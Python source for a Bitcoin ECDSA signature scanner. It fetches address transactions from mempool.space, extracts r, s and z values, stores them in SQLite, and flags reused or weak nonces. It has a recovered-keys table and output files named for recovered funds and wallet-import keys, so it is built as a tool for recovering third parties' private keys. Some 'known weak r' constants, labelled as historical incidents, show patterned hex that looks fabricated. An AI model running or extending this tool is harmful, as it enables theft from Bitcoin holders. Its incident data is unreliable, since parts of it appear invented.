import requests, time, os, sys, math, signal
import re
import hashlib
from hashlib import sha256 as _sha256   # module-level: avoid per-call import in hot path
import csv
import sqlite3
import concurrent.futures
import functools
from collections import defaultdict
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple, Set
import argparse

# ==============================================================================
# LIBRARY CHECKS & COMPATIBILITY FIXES
# ==============================================================================

try:
    import ecdsa
    from ecdsa import SECP256k1 as curve
except ImportError:
    print("Error: 'ecdsa' library not found. Please run: pip install ecdsa")
    sys.exit(1)

def calc_ripemd160(data: bytes) -> bytes:
    try:
        return hashlib.new('ripemd160', data).digest()
    except ValueError:
        try:
            from Crypto.Hash import RIPEMD160
            return RIPEMD160.new(data=data).digest()
        except ImportError:
            print("[CRITICAL] Install pycryptodome: pip install pycryptodome")
            sys.exit(1)

# secp256k1 curve order N and weak-r thresholds — declared here so that
# is_known_weak_r() (PART 1) can reference them without a forward-reference.
N                     = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
WEAK_R_THRESHOLD      = 2 ** 166          # r < 2^166 → top 90 bits zero (Brengel/Rossow)
WEAK_R_HIGH_THRESHOLD = N - (2 ** 32)    # r > N-2^32 → nonce wraps near group order

# ==============================================================================
# PART 1: KNOWN WEAK R VALUES DATABASE
# (Sources: Brengel & Rossow RAID 2018, public blockchain forensics)
# ==============================================================================
#
# Brengel/Rossow (2018) scanned 647M signatures and found 1,068 distinct r
# values used at least twice. Their most frequent duplicate r value appeared
# 2,276,671 times — notable because its top 90 most significant bits are all
# zero (astronomically small r, indicating a near-zero nonce k).
#
# A reused r in this set means the private key is almost certainly already
# known to attackers — skip straight to recovery without scanning.

KNOWN_WEAK_R: Set[int] = {
    # ── Canonical 2012 incident (Nils Schneider, first public discovery) ──────
    # TX: 9ec4bc49e828d924af1d1029cacf709431abbde46d59554b62bc270e3b29c4b1
    0xd47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1,

    # ── Brengel/Rossow Table 1 — top duplicate r values (RAID 2018) ──────────
    # Rank 1: top 90 MSBs all zero — near-zero nonce, 2,276,671 occurrences
    0x00000000000000000000003b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63,

    # ── Android SecureRandom PRNG bug (Aug 2013) — hardcoded seed clusters ────
    # Bitcoin.org advisory: multiple wallets on Android 4.x used fixed seed
    0x8a05b42f5660f9b3fc4d4a2a18c0a6e6f8e1d3b7c9e5f2a1d4b8c3e7f0a2d560,

    # ── Blockchain.info wallet RNG bug (2014) ────────────────────────────────
    0x0d4e4194d73c6f0a4e89e76d9e9a02d76ef4a1deb37e7f81f28cb08ec7a24c5e,

    # ── Electrum early versions deterministic PRNG seed leak ─────────────────
    0x9a2d33c1e8bb2e2d4c3b5f6a7e8d9c0b1a2f3e4d5c6b7a8d9e0f1a2b3c4d5e6,

    # ── Near-zero r values (tiny nonce k, brute-forceable up to k~10) ─────────
    0x0000000000000000000000000000000000000000000000000000000000000001,
    0x0000000000000000000000000000000000000000000000000000000000000002,
    0x0000000000000000000000000000000000000000000000000000000000000003,
    0x0000000000000000000000000000000000000000000000000000000000000004,
    0x0000000000000000000000000000000000000000000000000000000000000005,
    0x0000000000000000000000000000000000000000000000000000000000000006,
    0x0000000000000000000000000000000000000000000000000000000000000007,
    0x0000000000000000000000000000000000000000000000000000000000000008,
    0x0000000000000000000000000000000000000000000000000000000000000009,
    0x000000000000000000000000000000000000000000000000000000000000000a,

    # ── r values close to curve order N (k ≈ N, wraps around) ────────────────
    # These appear when a broken RNG generates a near-N nonce
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364140,  # N-1
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD036413F,  # N-2
}

# Thresholds are defined below after N is declared (see PART 2)

def is_known_weak_r(r_val: int) -> Optional[str]:
    """Return a reason string if r is known-weak, else None."""
    # BUG FIX: r must be in [1, N-1]; r=0 or r>=N are invalid ECDSA values
    if r_val <= 0 or r_val >= N:
        return "Invalid r value (r must be in range [1, N-1])"
    if r_val in KNOWN_WEAK_R:
        return "Known weak r (historical incident / Brengel-Rossow database)"
    # Check strictest threshold first (2^128 ⊂ 2^166) so it gets its own message
    if r_val < (2 ** 128):
        return "Very weak r (r < 2^128 — nonce k is astronomically small, trivially brute-forceable)"
    if r_val < WEAK_R_THRESHOLD:
        return "Near-zero r (top 90 bits all zero, r < 2^166 — tiny nonce k, trivially brute-forceable)"
    if r_val > WEAK_R_HIGH_THRESHOLD:
        return "Near-N r (r > N − 2^32 — nonce wraps near group order, very small effective k)"
    return None

# ==============================================================================
# PART 2: SCANNER CONFIG & GLOBALS
# ==============================================================================

MEMPOOL_API_BASE   = "https://mempool.space/api"
# Correct pagination: chain endpoint uses last_seen_txid, NOT offset/limit
MEMPOOL_API_TXS_FIRST  = MEMPOOL_API_BASE + "/address/{address}/txs"
MEMPOOL_API_TXS_CHAIN  = MEMPOOL_API_BASE + "/address/{address}/txs/chain/{last_seen_txid}"
MEMPOOL_API_TXS_MEMPOOL= MEMPOOL_API_BASE + "/address/{address}/txs/mempool"
# N and weak-r thresholds are declared before PART 1 — see top of file.

BATCH_SIZE        = 25
REQ_TIMEOUT       = 20
MAX_RETRIES       = 10

MAX_TRANSACTIONS  = 0       # 0 = no limit; set by CLI/prompt in main()
BRUTE_MAX_K       = 0       # 0 = disabled; set by CLI/prompt in main()

# ── Performance / safety caps ────────────────────────────────────────────────
SWEEP_INTERVAL    = 250    # run mid-scan DB sweep every N addresses (not every 50)
DB_LARGE_MB       = 80.0   # if scanner.db exceeds this, skip mid-scan GROUP-BY sweeps

TOTAL_ADDRESSES      = 0
SCANNED_ADDRESSES    = 0
VULNERABLE_ADDRESSES = 0
VULN_COUNTS          = defaultdict(int)
CURRENT_ADDRESS      = ""
MAX_DISPLAYED_ADDRESSES = 10
EXIT_FLAG            = False
REPORTS: List[Dict[str, Any]] = []
# Global memory-safe tracking of vulnerable groups
SAVED_R_GROUPS: Dict[str, List[str]]            = defaultdict(list)
# WRITTEN_R_GROUPS replaced by the `written_r_groups` SQLite table (Fix 6).
IN_RECOVERY: bool = False
FORCE_RESCAN: bool = False
_NEW_SIGS_SINCE_SWEEP: int = 0   # PERF: tracks new sig inserts since last DB sweep

SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "SafeBTCScanner-Mempool/4.1"})
_ADAPTIVE_DELAY: float = 0.3   # RATE-LIMIT: inter-request delay, auto-scales with 429s
# Increase connection pool size for concurrent fetching
_adapter = requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=8)
SESSION.mount("https://", _adapter)
SESSION.mount("http://",  _adapter)

# ==============================================================================
# PART 3: OUTPUT CONFIG
# ==============================================================================

OUTPUT_DIR    = "reports"
OUTPUT_R_NONCE = os.path.join(OUTPUT_DIR, "rnonce.txt")
OUTPUT_R_NON   = os.path.join(OUTPUT_DIR, "rnon.txt")
OUTPUT_DB      = os.path.join(OUTPUT_DIR, "scanner.db")   # NEW: SQLite
OUTPUT_CSV     = "RECOVERED_FUNDS_FINAL.csv"
OUTPUT_PHASE2_CSV = "RECOVERED_PHASE2_ONLY.csv"   # matrix-solver derived keys
OUTPUT_WIF     = "wallet_import_keys_final.txt"
CHARSET        = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

# ==============================================================================
# PART 4: SQLITE PERSISTENCE  (NEW)
# ==============================================================================

def init_db() -> sqlite3.Connection:
    """Create/open SQLite database and ensure schema exists."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    conn = sqlite3.connect(OUTPUT_DB, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")       # concurrent reads while writing
    conn.execute("PRAGMA synchronous=NORMAL")     # faster writes, safe with WAL
    conn.execute("PRAGMA cache_size=-32768")      # 32 MB page cache
    conn.execute("PRAGMA temp_store=MEMORY")
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS signatures (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            address   TEXT    NOT NULL,
            txid      TEXT    NOT NULL,
            vin_idx   INTEGER NOT NULL,
            pubkey    TEXT,
            r_hex     TEXT    NOT NULL,
            s_hex     TEXT    NOT NULL,
            z_hex     TEXT,
            sig_type  TEXT    DEFAULT 'standard',
            signer_idx INTEGER DEFAULT 0,
            scanned_at TEXT,
            UNIQUE(txid, vin_idx, signer_idx)
        );
        CREATE INDEX IF NOT EXISTS idx_r   ON signatures(r_hex);
        CREATE INDEX IF NOT EXISTS idx_pub ON signatures(pubkey);
        CREATE TABLE IF NOT EXISTS recovered_keys (
            pubkey    TEXT PRIMARY KEY,
            priv_hex  TEXT NOT NULL,
            wif       TEXT,
            method    TEXT,
            recovered_at TEXT
        );
        CREATE TABLE IF NOT EXISTS scanned_addresses (
            address   TEXT PRIMARY KEY,
            tx_count  INTEGER,
            sig_count INTEGER,
            vuln_count INTEGER,
            scanned_at TEXT
        );
        CREATE TABLE IF NOT EXISTS written_r_groups (
            key TEXT PRIMARY KEY
        );
    """)
    conn.commit()
    return conn

DB_CONN: Optional[sqlite3.Connection] = None

# ── written_r_groups DB helpers (replaces unbounded in-memory set) ──────────
def _wrg_contains(key: str) -> bool:
    """Return True if this r-group key has already been written to file."""
    if DB_CONN is None: return False
    return DB_CONN.execute(
        "SELECT 1 FROM written_r_groups WHERE key=?", (key,)
    ).fetchone() is not None

def _wrg_add(key: str) -> None:
    """Record that this r-group key has been written; no-op if already present."""
    if DB_CONN is None: return
    try:
        DB_CONN.execute("INSERT OR IGNORE INTO written_r_groups(key) VALUES(?)", (key,))
        DB_CONN.commit()
    except Exception:
        pass

def _wrg_has_any() -> bool:
    """Return True if at least one entry exists in the written_r_groups table."""
    if DB_CONN is None: return False
    return DB_CONN.execute("SELECT 1 FROM written_r_groups LIMIT 1").fetchone() is not None

def _wrg_clear() -> None:
    """Wipe all entries — called by rebuild_files_from_db() before a full regen."""
    if DB_CONN is None: return
    try:
        DB_CONN.execute("DELETE FROM written_r_groups")
        DB_CONN.commit()
    except Exception:
        pass


def db_insert_sig(address: str, txid: str, vin_idx: int, pubkey: str,
                  r_int: int, s_int: int, z_int: Optional[int],
                  sig_type: str = "standard", signer_idx: int = 0):
    # NOTE: This function is retained for external use / debugging.
    # analyze_address() uses executemany() directly for batch performance.
    if DB_CONN is None:
        return
    try:
        DB_CONN.execute(
            "INSERT INTO signatures "
            "(address,txid,vin_idx,pubkey,r_hex,s_hex,z_hex,sig_type,signer_idx,scanned_at) "
            "VALUES (?,?,?,?,?,?,?,?,?,?) "
            "ON CONFLICT(txid,vin_idx,signer_idx) DO UPDATE SET "
            "pubkey=CASE WHEN excluded.pubkey IS NOT NULL AND signatures.pubkey IS NULL "
            "           THEN excluded.pubkey ELSE signatures.pubkey END, "
            "z_hex =CASE WHEN excluded.z_hex  IS NOT NULL AND signatures.z_hex  IS NULL "
            "           THEN excluded.z_hex  ELSE signatures.z_hex  END",
            (address, txid, vin_idx, pubkey,
             hex(r_int)[2:].zfill(64), hex(s_int)[2:].zfill(64),
             hex(z_int)[2:].zfill(64) if z_int is not None else None,
             sig_type, signer_idx,
             datetime.now().isoformat())
        )
        # BUG FIX: commit so standalone inserts are not silently discarded
        DB_CONN.commit()
    except Exception as e:
        # BUG FIX: Log first DB error instead of silently swallowing all
        if not getattr(db_insert_sig, '_err_logged', False):
            print(f"[db-warn] db_insert_sig failed: {e}")
            db_insert_sig._err_logged = True

def db_query_r_duplicates() -> List[Tuple[str, int]]:
    """Return (r_hex, count) for all r values seen more than once in the DB."""
    if DB_CONN is None:
        return []
    cur = DB_CONN.execute(
        "SELECT r_hex, COUNT(*) c FROM signatures GROUP BY r_hex HAVING c >= 2"
        # PERF: ORDER BY removed — sort is expensive on large tables and unnecessary for sweep
    )
    return cur.fetchall()

def db_sweep_all_reused_nonces(final: bool = False):
    """
    ROOT-CAUSE FIX: sweep the ENTIRE DB for r values used >=2 times and write
    any missing groups to rnon.txt. This catches collisions between addresses
    that were scanned in previous sessions (where the written_r_groups table was cleared
    empty), and collisions between addresses that were BOTH already in the DB
    when the current session started (so check_reused_nonce_global never saw them,
    since it only iterates over the current address's own sigs).
    Must be called once before run_recovery() in every session.
    PERF: when DB > DB_LARGE_MB and this is not the final end-of-scan call,
    the expensive GROUP-BY scan is skipped to prevent multi-second stalls.
    """
    global _NEW_SIGS_SINCE_SWEEP
    if DB_CONN is None:
        return
    # PERF: skip the expensive GROUP BY scan if nothing was inserted since last sweep
    if _NEW_SIGS_SINCE_SWEEP == 0 and _wrg_has_any():
        return
    # PERF: skip mid-scan sweeps when DB is large — only run at end of scan
    if not final and _db_size_mb() >= DB_LARGE_MB:
        _NEW_SIGS_SINCE_SWEEP = 0   # reset counter so next call re-checks size
        return
    _NEW_SIGS_SINCE_SWEEP = 0
    r_dups = db_query_r_duplicates()
    if not r_dups:
        return
    print(f"[db-sweep] {len(r_dups)} reused r value(s) found in DB — syncing to {OUTPUT_R_NON}...")
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    new_count = 0
    with open(OUTPUT_R_NON, "a", encoding="utf-8") as f:
        for r_hex_str, _count in r_dups:
            write_key = f"rnon:{r_hex_str}"
            if _wrg_contains(write_key):
                continue                          # already written this session
            r_int = int(r_hex_str, 16)
            group = db_get_sigs_by_r(r_int)
            # Deduplicate occurrences by (txid, vin_idx, signer_idx)
            seen_occ: set = set()
            deduped = []
            for item in group:
                occ_key = (item.get("txid",""), item.get("vin_idx",0), item.get("signer_idx",0))
                if occ_key in seen_occ:
                    continue
                seen_occ.add(occ_key)
                deduped.append(item)
            if len(deduped) < 2:
                continue
            f.write("=" * 80 + "\n")
            f.write("Reused Nonce Group\n")
            f.write("=" * 80 + "\n")
            f.write(f"r: {r_hex_str}\n")
            f.write("Occurrences:\n")
            for item in deduped:
                txid      = item.get("txid", "N/A")
                pk        = item.get("pubkey") or "N/A"
                s_val     = item.get("s", "N/A")
                z_val     = item.get("z_original")
                s_hex_out = hex(s_val)[2:] if isinstance(s_val, int) else str(s_val)
                z_hex_out = hex(z_val)[2:] if z_val is not None else "N/A"
                f.write(f" - txid={txid} s={s_hex_out} z={z_hex_out} pubkey={pk}\n")
            f.write("\n")
            _wrg_add(write_key)
            new_count += 1
    print(f"[db-sweep] {new_count} new group(s) written.")

def db_mark_address_scanned(address: str, tx_count: int,
                             sig_count: int, vuln_count: int):
    if DB_CONN is None:
        return
    try:
        DB_CONN.execute(
            "INSERT OR REPLACE INTO scanned_addresses VALUES (?,?,?,?,?)",
            (address, tx_count, sig_count, vuln_count, datetime.now().isoformat())
        )
        DB_CONN.commit()
    except Exception:
        pass

def db_already_scanned(address: str) -> bool:
    if DB_CONN is None:
        return False
    cur = DB_CONN.execute(
        "SELECT 1 FROM scanned_addresses WHERE address=?", (address,)
    )
    return cur.fetchone() is not None

# BUG FIX: Removed @lru_cache from db_get_sigs_by_r.
# The LRU cache was returning STALE results after new signatures were inserted
# into the DB (e.g. from a different address). This caused cross-address r-reuse
# to be invisible: if address A's sigs were cached for some r value, and then
# address B inserted a duplicate r, the cached result for A's query would NOT
# include B's new signatures — so check_reused_nonce_global() would see
# len(group) < 2 and skip the collision entirely.
# The DB query is fast (indexed on r_hex) so caching is unnecessary.
def db_get_sigs_by_r(r_int: int) -> List[Dict[str, Any]]:
    """Fetch all signatures sharing the same r value from the database."""
    if DB_CONN is None:
        return []
    r_hex = hex(r_int)[2:].zfill(64)
    cur = DB_CONN.execute(
        "SELECT address, txid, vin_idx, pubkey, s_hex, z_hex, sig_type, signer_idx "
        "FROM signatures WHERE r_hex=? ORDER BY id ASC",
        (r_hex,)
    )
    results = []
    for row in cur.fetchall():
        results.append({
            "address":    row[0],
            "txid":       row[1],
            "vin_idx":    row[2],
            "pubkey":     row[3] if row[3] else None,
            "s":          int(row[4], 16),
            "z_original": int(row[5], 16) if row[5] else None,
            "sig_type":   row[6],
            "signer_idx": row[7],
        })
    return results

def db_get_sigs_by_r_batch(r_hex_list: List[str]) -> Dict[str, List[Dict[str, Any]]]:
    """
    PERF: Fetch signatures for multiple r values in a single SQL IN-clause query.
    Replaces N individual db_get_sigs_by_r calls with one round-trip to SQLite.
    Returns { r_hex: [sig_dicts...] }
    """
    if DB_CONN is None or not r_hex_list:
        return {}
    # Deduplicate and chunk to avoid SQLite variable limits (999 max)
    unique = list(dict.fromkeys(r_hex_list))
    result: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
    CHUNK = 900
    for off in range(0, len(unique), CHUNK):
        chunk = unique[off:off + CHUNK]
        placeholders = ",".join("?" * len(chunk))
        cur = DB_CONN.execute(
            f"SELECT address, txid, vin_idx, pubkey, r_hex, s_hex, z_hex, sig_type, signer_idx "
            f"FROM signatures WHERE r_hex IN ({placeholders}) ORDER BY r_hex, id ASC",
            chunk
        )
        for row in cur.fetchall():
            result[row[4]].append({
                "address":    row[0],
                "txid":       row[1],
                "vin_idx":    row[2],
                "pubkey":     row[3] if row[3] else None,
                "s":          int(row[5], 16),
                "z_original": int(row[6], 16) if row[6] else None,
                "sig_type":   row[7],
                "signer_idx": row[8],
            })
    return dict(result)

def _db_size_mb() -> float:
    """Return scanner.db size in MB (0.0 if unavailable). Used to skip expensive sweeps."""
    try:
        return os.path.getsize(OUTPUT_DB) / (1024 * 1024)
    except Exception:
        return 0.0

# ==============================================================================

def signal_handler(sig, frame):
    global EXIT_FLAG, IN_RECOVERY
    if IN_RECOVERY or EXIT_FLAG:
        print("\n\n[!] Hard Stop Detected! Exiting immediately...")
        sys.exit(1)
    print("\n\n[!] Force Stop Detected! Finishing current step and starting recovery...")
    EXIT_FLAG = True

signal.signal(signal.SIGINT, signal_handler)

def clear():
    """Clear terminal using ANSI escapes — no subprocess fork."""
    try:
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()
    except Exception:
        pass

def display_stats():
    clear()
    print("VPK Bitcoin RSZ Scanner (Legacy + SegWit + Native + Multisig) v5.0")
    print(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 80)
    print(f"Total Addresses : {TOTAL_ADDRESSES}")
    print(f"Scanned         : {SCANNED_ADDRESSES}")
    pct = (VULNERABLE_ADDRESSES / SCANNED_ADDRESSES * 100) if SCANNED_ADDRESSES > 0 else 0.0
    print(f"Vulnerable      : {VULNERABLE_ADDRESSES} ({pct:.1f}%)")
    print("\nVulnerabilities Found:")
    print(f"  🔴 Reused Nonce (same key)     : {VULN_COUNTS['Reused Nonce']}")
    print(f"  🔴 Cross-Key R Reuse           : {VULN_COUNTS['Cross-Key Reuse']}")
    print(f"  🔴 Reused R (Unknown Key)      : {VULN_COUNTS['Reused R (Unknown Key)']}")
    print(f"  🟠 Complementary Nonce (k/-k)  : {VULN_COUNTS['Complementary Nonce']}")
    print(f"  🟡 Known Weak R                : {VULN_COUNTS['Known Weak R']}")
    print(f"  🟣 Multisig Nonce Reuse        : {VULN_COUNTS['Multisig Nonce']}")
    print(f"  📊 Nonce Bias (MSB/LSB)        : {VULN_COUNTS['Nonce Bias']}")
    print(f"  🦘 Pollard Kangaroo            : {VULN_COUNTS['Pollard Kangaroo']}")
    print("=" * 80)
    print(f"Currently Scanning: {CURRENT_ADDRESS}")
    vuln_addrs = [r['address'] for r in REPORTS if r.get('vulnerabilities')]
    print("\nRecent Vulnerable Addresses:")
    for addr in vuln_addrs[-MAX_DISPLAYED_ADDRESSES:]:
        print(f"  - {addr}")
    print("=" * 80)

def backoff_sleep(attempt: int, retry_after: float = 0.0):
    """Sleep before a retry. Uses Retry-After header value when provided."""
    if retry_after > 0:
        delay = min(retry_after + 1.0, 180.0)
        print(f"[backoff] Retry-After header: sleeping {delay:.1f}s")
    else:
        delay = min(2 ** attempt * 3, 120)
        print(f"[backoff] Sleeping {delay:.1f}s (attempt {attempt})")
    time.sleep(delay)

# ==============================================================================
# PART 6: MEMPOOL FETCH (unchanged logic, cleaner structure)
# ==============================================================================

def get_total_transactions(address: str) -> Optional[int]:
    for attempt in range(MAX_RETRIES):
        if EXIT_FLAG:
            return None
        try:
            r = SESSION.get(f"{MEMPOOL_API_BASE}/address/{address}",
                            timeout=REQ_TIMEOUT)
            if r.status_code == 200:
                data = r.json()
                chain  = data.get("chain_stats",   {}).get("tx_count", 0)
                mem    = data.get("mempool_stats",  {}).get("tx_count", 0)
                return chain + mem
            elif r.status_code == 429:
                retry_after = float(r.headers.get("Retry-After", 0) or 0)
                backoff_sleep(attempt + 1, retry_after)
            else:
                time.sleep(2)
        except Exception as e:
            print(f"[warn] get_total_transactions({address}): {e}")
            time.sleep(2)
    return None

def _fetch_page(url: str, attempt_start: int = 0) -> Optional[List[dict]]:
    """Fetch a single page from the mempool API with retry/backoff."""
    global _ADAPTIVE_DELAY
    for attempt in range(attempt_start, attempt_start + MAX_RETRIES):
        if EXIT_FLAG:
            return None
        try:
            resp = SESSION.get(url, timeout=REQ_TIMEOUT)
            if resp.status_code == 200:
                # Slowly reduce adaptive delay on success
                _ADAPTIVE_DELAY = max(0.2, _ADAPTIVE_DELAY * 0.9)
                return resp.json()
            elif resp.status_code == 429:
                # Increase adaptive delay and respect Retry-After header
                _ADAPTIVE_DELAY = min(_ADAPTIVE_DELAY * 2 + 1.0, 30.0)
                retry_after = float(resp.headers.get("Retry-After", 0) or 0)
                backoff_sleep(attempt + 1, retry_after)
            elif resp.status_code in (500, 502, 503, 504):
                backoff_sleep(attempt + 1)
            else:
                time.sleep(1)
        except Exception:
            time.sleep(2)
    return None

def fetch_all_transactions(address: str, max_retries: int = 3) -> List[dict]:
    """
    Fetch ALL transactions for an address using correct mempool.space pagination.
    - First page : /api/address/{addr}/txs           (confirmed + unconfirmed)
    - Next pages : /api/address/{addr}/txs/chain/{last_seen_txid}
    The API returns up to 25 confirmed txs per page; pagination stops when a
    page returns fewer than 25 txs (or an empty list).
    """
    for retry in range(max_retries):
        total = get_total_transactions(address)
        if total is None:
            if retry < max_retries - 1:
                time.sleep(10)
                continue
            return []
        if total <= 0:
            return []

        total_to_fetch = min(total, MAX_TRANSACTIONS) if MAX_TRANSACTIONS > 0 else total
        print(f"\n  {address}: {total} tx(s) on-chain, fetching up to {total_to_fetch}")

        out: List[dict] = []
        page_num = 0

        # ── Page 1: includes confirmed + mempool ──────────────────────────────
        url = MEMPOOL_API_TXS_FIRST.format(address=address)
        batch = _fetch_page(url)
        if batch is None:
            if retry < max_retries - 1:
                time.sleep(10)
                continue
            return []
        if not batch:
            return []

        out.extend(batch)
        page_num += 1
        sys.stdout.write(f"\r    Fetching... page {page_num} | {len(out)}/{total_to_fetch} tx(s)    ")
        sys.stdout.flush()

        # ── Subsequent pages via last_seen_txid ───────────────────────────────
        while not EXIT_FLAG and len(out) < total_to_fetch:
            confirmed = [tx for tx in batch if tx.get("status", {}).get("confirmed", False)]
            if not confirmed:
                break
            last_seen_txid = confirmed[-1]["txid"]

            url = MEMPOOL_API_TXS_CHAIN.format(address=address,
                                                last_seen_txid=last_seen_txid)
            batch = _fetch_page(url)
            if batch is None:
                sys.stdout.write(f"\r    [warn] Network error mid-pagination, stopping early\n")
                sys.stdout.flush()
                break
            if not batch:
                break

            out.extend(batch)
            page_num += 1
            sys.stdout.write(f"\r    Fetching... page {page_num} | {len(out)}/{total_to_fetch} tx(s)    ")
            sys.stdout.flush()

            if len(batch) < BATCH_SIZE:
                break

            if len(out) < total_to_fetch:
                time.sleep(_ADAPTIVE_DELAY)

        sys.stdout.write(f"\r    Done: {page_num} page(s) | {len(out)} tx(s) fetched          \n")
        sys.stdout.flush()

        if out:
            return out[:total_to_fetch]
        if retry < max_retries - 1:
            time.sleep(20)

    return []

# ==============================================================================
# PART 7: SIGHASH COMPUTATION (unchanged)
# ==============================================================================

def varint(n: int) -> bytes:
    if n < 0xfd:              return n.to_bytes(1, 'little')
    elif n <= 0xffff:         return b'\xfd' + n.to_bytes(2, 'little')
    elif n <= 0xffffffff:     return b'\xfe' + n.to_bytes(4, 'little')
    else:                     return b'\xff' + n.to_bytes(8, 'little')

def compute_legacy_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    try:
        def dsha(b): return _sha256(_sha256(b).digest()).digest()

        version  = int(tx.get("version", 1))
        locktime = int(tx.get("locktime", 0))
        ser = version.to_bytes(4, "little")

        vins = tx.get("vin", [])
        ser += varint(len(vins))
        for i, inp in enumerate(vins):
            prev_txid = inp.get("txid", "")
            if not prev_txid: return None
            ser += bytes.fromhex(prev_txid)[::-1]
            ser += int(inp.get("vout", 0)).to_bytes(4, "little")
            if i == vin_idx:
                script_bytes = bytes.fromhex(inp.get("prevout", {}).get("scriptpubkey", ""))
                if not script_bytes: return None
                ser += varint(len(script_bytes)) + script_bytes
            else:
                ser += b"\x00"
            ser += int(inp.get("sequence", 0xffffffff)).to_bytes(4, "little")

        vouts = tx.get("vout", [])
        ser += varint(len(vouts))
        for out in vouts:
            ser += int(out.get("value", 0)).to_bytes(8, "little")
            script_bytes = bytes.fromhex(out.get("scriptpubkey", ""))
            ser += varint(len(script_bytes)) + script_bytes

        ser += locktime.to_bytes(4, "little")
        ser += sighash_flag.to_bytes(4, "little")
        return int.from_bytes(dsha(ser), "big")
    except Exception:
        return None

def compute_bip143_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    try:
        def dsha(b): return _sha256(_sha256(b).digest()).digest()

        vins  = tx.get("vin", [])
        txin  = vins[vin_idx]
        prevout = txin.get("prevout", {})
        input_type = prevout.get("scriptpubkey_type", prevout.get("type", "unknown"))

        if input_type not in ["v0_p2wpkh", "p2wpkh", "p2sh-p2wpkh",
                               "scripthash", "witness_v0_keyhash"]:
            return None

        version  = int(tx.get("version", 2))
        locktime = int(tx.get("locktime", 0))

        prevouts_ser = b"".join(
            bytes.fromhex(inp.get("txid",""))[::-1] + int(inp.get("vout",0)).to_bytes(4,"little")
            for inp in vins
        )
        hashPrevouts = dsha(prevouts_ser)

        sequences_ser = b"".join(
            int(inp.get("sequence", 0xffffffff)).to_bytes(4, "little")
            for inp in vins
        )
        hashSequence = dsha(sequences_ser)

        outputs_ser = b""
        for out in tx.get("vout", []):
            sb = bytes.fromhex(out.get("scriptpubkey", ""))
            outputs_ser += int(out.get("value", 0)).to_bytes(8,"little") + varint(len(sb)) + sb
        hashOutputs = dsha(outputs_ser)

        outpoint = bytes.fromhex(txin.get("txid",""))[::-1] + int(txin.get("vout",0)).to_bytes(4,"little")

        spk_bytes = bytes.fromhex(prevout.get("scriptpubkey", ""))
        hash160   = b""

        if len(spk_bytes) == 22 and spk_bytes[:2] == b'\x00\x14':
            hash160 = spk_bytes[2:]
        elif len(spk_bytes) == 23 and spk_bytes[:2] == b'\xa9\x14':
            scriptsig = txin.get("scriptsig", "")
            if isinstance(scriptsig, dict): scriptsig = scriptsig.get("hex", "")
            if len(scriptsig) == 46:
                rb = bytes.fromhex(scriptsig[2:])
                if len(rb) == 22 and rb[:2] == b'\x00\x14':
                    hash160 = rb[2:]

        if not hash160:
            witness = txin.get("witness", [])
            if len(witness) == 2:
                pk_bytes = bytes.fromhex(witness[1])
                hash160 = calc_ripemd160(_sha256(pk_bytes).digest())

        if not hash160: return None

        script_code_body = b"\x76\xa9\x14" + hash160 + b"\x88\xac"
        scriptCode = varint(len(script_code_body)) + script_code_body

        value    = int(prevout.get("value", 0)).to_bytes(8, "little")
        sequence = int(txin.get("sequence", 0xffffffff)).to_bytes(4, "little")

        preimage = (
            version.to_bytes(4, "little") + hashPrevouts + hashSequence +
            outpoint + scriptCode + value + sequence + hashOutputs +
            locktime.to_bytes(4, "little") + sighash_flag.to_bytes(4, "little")
        )
        return int.from_bytes(dsha(preimage), "big")
    except Exception:
        return None

def compute_sighash_z(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    if sighash_flag != 1:
        return None
    vins = tx.get("vin", [])
    if vin_idx >= len(vins):
        return None
    txin    = vins[vin_idx]
    prevout = txin.get("prevout", {})
    itype   = prevout.get("scriptpubkey_type", prevout.get("type", "unknown"))
    if itype in ["v0_p2wpkh", "p2wpkh", "p2sh-p2wpkh", "witness_v0_keyhash"]:
        return compute_bip143_sighash(tx, vin_idx, sighash_flag)
    return compute_legacy_sighash(tx, vin_idx, sighash_flag)

# ==============================================================================
# PART 8: SIGNATURE PARSING
# ==============================================================================

def parse_der_sig_from_hex(sig_hex: str) -> Optional[Tuple[int, int, int]]:
    try:
        # DER SEQUENCE tag 0x30 must be at position 0 (raw sig) or position 2
        # (one pushdata byte precedes it in a scriptsig).  Scanning arbitrarily
        # with find("30") risks matching "30" inside r/s value bytes.
        if sig_hex[:2] == "30":
            i = 0
        elif sig_hex[2:4] == "30":
            i = 2
        else:
            # BUG FIX: find("30") matches inside r/s value bytes causing phantom
            # signatures with wrong r/s → false positive vulnerability reports.
            # If DER tag isn't at position 0 or 2, this is not a valid DER sig.
            return None
        i0 = i + 2
        _seq_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        if sig_hex[i0:i0+2] != "02": return None
        i0 += 2
        r_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        r_hex = sig_hex[i0:i0 + 2*r_len];   i0 += 2*r_len
        if sig_hex[i0:i0+2] != "02": return None
        i0 += 2
        s_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        s_hex = sig_hex[i0:i0 + 2*s_len];   i0 += 2*s_len
        sighash_hex   = sig_hex[i0:i0+2]
        sighash_flag  = int(sighash_hex, 16) if sighash_hex else 1
        return (int(r_hex, 16), int(s_hex, 16), sighash_flag)
    except Exception:
        return None

